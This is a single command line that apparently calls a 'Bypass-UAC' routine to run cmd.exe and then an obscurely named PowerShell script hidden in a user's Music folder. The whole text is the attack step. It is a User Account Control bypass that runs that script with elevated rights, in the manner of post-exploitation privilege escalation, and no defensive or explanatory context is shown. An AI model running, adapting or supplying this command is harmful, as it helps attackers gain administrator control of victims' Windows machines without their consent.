Bypass-UAC -command "cmd.exe /k powershell.exe c:/users/%username%/music/efq68mtn.ps1"
